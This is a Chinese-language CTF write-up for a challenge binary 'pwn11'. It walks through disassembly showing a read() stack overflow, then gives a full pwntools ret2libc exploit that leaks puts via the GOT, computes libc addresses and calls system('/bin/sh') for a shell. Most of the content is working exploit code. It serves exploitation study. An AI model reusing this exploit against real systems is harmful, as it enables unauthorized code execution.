# WriteUp

---  

此题在远端没有成功,但是本地成功提权,基本思路是leak两个函数地址,然后搜索对应的libc.so.但是我似乎并没有找到对应的版本...有点难受,考虑了一下dynELF应该可以,但是我没看懂puts怎么利用的,日后尝试一下.

汇编如下:
```assembly
  4011c9:       ba 0a 00 00 00          mov    $0xa,%edx
  4011ce:       48 89 c6                mov    %rax,%rsi
  4011d1:       bf 00 00 00 00          mov    $0x0,%edi
  4011d6:       e8 75 fe ff ff          callq  401050 <read@plt>
  4011db:       48 8d 45 d6             lea    -0x2a(%rbp),%rax
  4011df:       48 89 c6                mov    %rax,%rsi
  4011e2:       48 8d 3d 4d 0e 00 00    lea    0xe4d(%rip),%rdi        # 402036 <setvbuf@plt+0xfc6>
  4011e9:       b8 00 00 00 00          mov    $0x0,%eax
  4011ee:       e8 4d fe ff ff          callq  401040 <printf@plt>
  4011f3:       48 8d 3d 4e 0e 00 00    lea    0xe4e(%rip),%rdi        # 402048 <setvbuf@plt+0xfd8>
  4011fa:       e8 31 fe ff ff          callq  401030 <puts@plt>
  4011ff:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  401203:       ba 00 01 00 00          mov    $0x100,%edx
  401208:       48 89 c6                mov    %rax,%rsi
  40120b:       bf 00 00 00 00          mov    $0x0,%edi
  401210:       e8 3b fe ff ff          callq  401050 <read@plt>
  401215:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  401219:       48 8d 35 30 2e 00 00    lea    0x2e30(%rip),%rsi        # 404050 <setvbuf@plt+0x2fe0>
  401220:       48 89 c7                mov    %rax,%rdi
  401223:       e8 38 fe ff ff          callq  401060 <strcmp@plt>
  401228:       85 c0                   test   %eax,%eax
  40122a:       75 0e                   jne    40123a <setvbuf@plt+0x1ca>
  40122c:       48 8d 3d 3f 0e 00 00    lea    0xe3f(%rip),%rdi        # 402072 <setvbuf@plt+0x1002>
  401233:       e8 f8 fd ff ff          callq  401030 <puts@plt>
  401238:       eb 0c                   jmp    401246 <setvbuf@plt+0x1d6>
  40123a:       48 8d 3d 35 0e 00 00    lea    0xe35(%rip),%rdi        # 402076 <setvbuf@plt+0x1006>
  401241:       e8 ea fd ff ff          callq  401030 <puts@plt>
  401246:       b8 00 00 00 00          mov    $0x0,%eax
  40124b:       c9                      leaveq
  40124c:       c3                      retq
```
可以看到很明显的read栈溢出,然后考虑如下rop:

> pop_rdi -> puts_got -> puts_plt -> main -> pop_rdi -> bin_sh -> system -> main

泄露puts实际地址的函数如下:
```python
def getPuts():
    print sh.recv()
    sleep(0.5)
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    sh.sendline(payload)
    sh.recvuntil('fail!\n')
    puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
    log.info("puts_addr => " + hex(puts_addr))
    return puts_addr
```
然后计算offset:

```python
offset = puts_addr - libc_puts
system_addr = offset + libc_system
bin_sh = offset + libc_sh
```

然后最后一步跳转到system:
```python
def getShell():
    sh.recv()
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main_addr)
    sh.sendline(payload)
```

完整exp如下:
```python
#!/usr/bin/python2

from pwn import *

sh = process('./pwn11')
#  sh = remote('111.33.164.4',50011)
elf = ELF('./pwn11')
#  libc = ELF('./libc-2.23.so')
libc = ELF('./libc.so')
context.log_level = 'debug'

pop_rdi = 0x004012ab
puts_plt = 0x00401030
puts_got = elf.got['puts']
read_got = elf.got['read']
start_got = elf.got['__libc_start_main']
libc_puts = libc.symbols['puts']
libc_system = libc.symbols['system']
libc_sh = libc.search('/bin/sh').next()
main_addr = 0x00401162

log.info("puts_got => "+hex(puts_got))
log.info("libc_puts => "+hex(libc_puts))
log.info("libc_system => "+hex(libc_system))


sh.recv()
sh.sendline('dyf')

def getPuts():
    print sh.recv()
    sleep(0.5)
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    sh.sendline(payload)
    sh.recvuntil('fail!\n')
    puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
    log.info("puts_addr => " + hex(puts_addr))
    return puts_addr

puts_addr = getPuts()
offset = puts_addr - libc_puts
system_addr = offset + libc_system
bin_sh = offset + libc_sh
log.info("system_addr => " + hex(system_addr))
log.info("bin_sh => " + hex(bin_sh))

sh.recv()
sh.sendline('dyf')
def getShell():
    sh.recv()
    payload = 'a' * 0x20 + 'b' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main_addr)
    sh.sendline(payload)

getShell()
sh.interactive()
```
